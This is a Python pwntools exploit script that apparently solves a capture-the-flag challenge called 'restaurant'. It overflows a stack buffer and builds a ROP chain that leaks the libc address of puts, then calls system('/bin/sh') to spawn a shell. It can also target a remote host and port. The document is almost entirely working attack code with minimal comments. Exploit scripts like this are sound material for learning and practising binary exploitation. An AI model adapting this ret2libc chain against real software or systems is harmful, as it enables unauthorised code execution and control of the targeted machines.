#!/usr/bin/env python
from pwn import *

exe = context.binary = ELF('./restaurant', checksec=False)
context.terminal = ['tmux', 'splitw', '-hb']

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return (gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw), ELF('/usr/lib/libc.so.6', checksec=False))
    if args.REMOTE:
        return (remote('139.59.176.149', 32543), ELF('./libc.so.6', checksec=False))
    else:
        return (process([exe.path] + argv, *a, **kw), ELF('/usr/lib/libc.so.6', checksec=False))

gdbscript = '''
break *fill+162
continue
'''.format(**locals())

rop = ROP(exe)

io, libc = start()

# offset to rsp
offset = 40

# some gadgets
pop_rdi_ret = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
ret         = p64(rop.find_gadget(['ret'])[0])

# for leaking puts address
puts_got    = p64(exe.got['puts'])
puts_plt    = p64(exe.plt['puts'])
main        = p64(exe.symbols['main'])

# for getting a shell
bin_sh_offset = next(libc.search(b"/bin/sh"))
system_offset = libc.symbols['system']
puts_offset   = libc.symbols['puts']

# get to overflow prompt
io.recvuntil("> ")
io.sendline("1")
io.recvuntil("> ")

# leak puts addr and jump to main
payload_leak = b"".join([
    b"A" * offset,
    pop_rdi_ret, # pop puts got address into rdi
    puts_got,
    puts_plt,    # leak puts address in libc
    main         # return to main from ROP
])
io.send(payload_leak)

#hide echo
io.recvline()

# get leaked puts address
puts = u64(io.recvline().strip()[-6:].ljust(8, b'\x00'))

# get to overflow prompt
io.recvuntil("> ")
io.sendline("1")
io.recvuntil("> ")

# get libc base address
libc_addr = puts - puts_offset
io.info(f"Got libc base address: {hex(libc_addr)}")

# calculate system and /bin/sh addresses
system = p64(libc_addr + system_offset)
bin_sh = p64(libc_addr + bin_sh_offset)

payload_rce = b"".join([
    b"A" * offset,
    ret,         # to re-align stack to 16 bytes
    pop_rdi_ret, # pop /bin/sh into rdi
    bin_sh,
    system
])
io.send(payload_rce)

# hide echo
io.recvline()
io.recv(len(payload_rce))

io.success("Should get a shell")

io.interactive()

